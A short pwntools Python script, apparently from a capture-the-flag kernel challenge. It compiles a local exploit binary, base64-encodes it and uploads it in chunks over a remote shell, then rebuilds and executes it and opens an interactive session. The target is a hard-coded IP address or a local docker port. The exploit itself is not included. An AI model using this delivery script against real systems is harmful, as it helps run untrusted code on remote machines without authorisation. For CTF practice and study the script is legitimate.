#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

import os
import base64
 
cmd = b'# '
 
docker = 1
 
def exploit(r):
    r.sendlineafter(cmd, (b'stty -echo'))
    os.system('musl-gcc  -static -O2 ./1.c -o ./exp')
    #os.system('musl-gcc  -static -O2 ./exp.c -o ./exp')
    os.system('gzip -c ./exp > ./exp.gz')

    with open('./exp.gz', 'rb') as file:
        data = file.read()

    data_b64 = base64.b64encode(data)
    total = len(data_b64)
    per_length = 0x200;
    i = 0
    while(True):
         bstr = data_b64[i:i+per_length]
         io.sendlineafter(cmd, ('echo -n {} >> ./exp.gz.b64'.format(bstr.decode()).encode()))
         i += per_length
         if(i + per_length > total):
            break

    if total - i > 0:
        bstr = data_b64[i:total]
        io.sendlineafter(cmd, ('echo -n {} >> ./exp.gz.b64'.format(bstr.decode()).encode()))
    
    r.sendlineafter(cmd, (b'base64 -d exp.gz.b64 > exp.gz'))
    r.sendlineafter(cmd, (b'gunzip ./exp.gz'))
    r.sendlineafter(cmd, (b'chmod +x ./exp'))
    context.log_level = 'debug'
    pause()
    r.sendlineafter(cmd, (b'./exp'))
    r.interactive()
 
 
if docker:
    io = remote('0.0.0.0',30002)
else:
    io = remote('35.221.156.78',30002)
 
exploit(io)
io.interactive()
